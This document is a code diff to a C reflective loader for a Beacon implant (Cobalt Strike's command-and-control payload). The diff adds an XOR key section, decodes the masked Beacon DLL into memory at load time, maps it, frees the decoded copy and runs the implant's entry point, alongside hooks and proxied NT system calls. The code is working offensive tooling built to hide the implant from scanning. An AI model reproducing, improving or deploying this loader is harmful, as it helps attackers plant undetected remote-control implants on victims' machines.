@@ -70,6 +70,7 @@ typedef struct {
 char __DRAUGR__[0] __attribute__((section("draugr")));
 char __HOOKS__[0]  __attribute__((section("hooks")));
 char __DLL__[0]    __attribute__((section("dll")));
+char __KEY__[0]    __attribute__((section("key")));
 
 void * allocateVirtualMemory(SIZE_T size, ULONG protect)
 {
@@ -104,6 +105,22 @@ void protectVirtualMemory(void * baseAddress, SIZE_T size, ULONG newProtect)
     args.argument3   = (ULONG_PTR)(&size);
     args.argument4   = (ULONG_PTR)(newProtect);
     args.argument5   = (ULONG_PTR)(&oldProtect);
+
+    ProxyNtApi(&args);
+}
+
+void freeVirtualMemory(void * baseAddress)
+{
+    NTARGS args;
+    memset(&args, 0, sizeof(NTARGS));
+
+    SIZE_T size = 0;
+
+    args.functionPtr = (ULONG_PTR)(NTDLL$NtFreeVirtualMemory);
+    args.argument1   = (ULONG_PTR)(HANDLE)(-1);
+    args.argument2   = (ULONG_PTR)(&baseAddress);
+    args.argument3   = (ULONG_PTR)(&size);
+    args.argument4   = (ULONG_PTR)(MEM_RELEASE);
 
     ProxyNtApi(&args);
 }
@@ -161,11 +178,13 @@ void fixSectionPermissions(DLLDATA * dll, char * src, char * dst, MEMORY_REGION 
 
 void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout)
 {
-    char    * hookSrc;
-    PICO    * hookDst;
-    char    * beaconSrc;
-    DLLDATA   beaconData;
-    char    * beaconDst;
+    char     * hookSrc;
+    PICO     * hookDst;
+    RESOURCE * keyRes;
+    RESOURCE * beaconRes;
+    DLLDATA    beaconData;
+    char     * beaconSrc;
+    char     * beaconDst;
 
     /* Time to load the hook PICO */
     hookSrc = GETRESOURCE(__HOOKS__);
@@ -203,13 +222,23 @@ void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout)
     /* Call it to install the hooks */
     picoEntry((IMPORTFUNCS *)funcs, layout);
 
-    /* Now load the DLL */
-    beaconSrc = GETRESOURCE(__DLL__);
+    /* Get XOR key */
+    keyRes = (RESOURCE *)GETRESOURCE(__KEY__);
+
+    /* Get XOR'd DLL */
+    beaconRes = (RESOURCE *)GETRESOURCE(__DLL__);
+
+    /* Unmask and copy it into memory */
+    beaconSrc = allocateVirtualMemory(beaconRes->length, PAGE_READWRITE);
+
+    for (int i = 0; i < beaconRes->length; i++) {
+        beaconSrc[i] = beaconRes->value[i] ^ keyRes->value[i % keyRes->length];
+    }
 
     /* Parse the headers */
     ParseDLL(beaconSrc, &beaconData);
 
-    /* Allocate memory for Beacon */
+    /* Allocate new memory for Beacon */
     beaconDst = allocateVirtualMemory(SizeOfDLL(&beaconData), PAGE_READWRITE);
 
     /* Load it into memory */
@@ -227,6 +256,9 @@ void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout)
 
     /* Get Beacon's entry point */
     DLLMAIN_FUNC beaconEntry = EntryPoint(&beaconData, beaconDst);
+
+    /* Free the unmasked copy */
+    freeVirtualMemory(beaconSrc);
 
     /* Call it twice */
     beaconEntry((HINSTANCE)beaconDst, DLL_PROCESS_ATTACH, NULL);
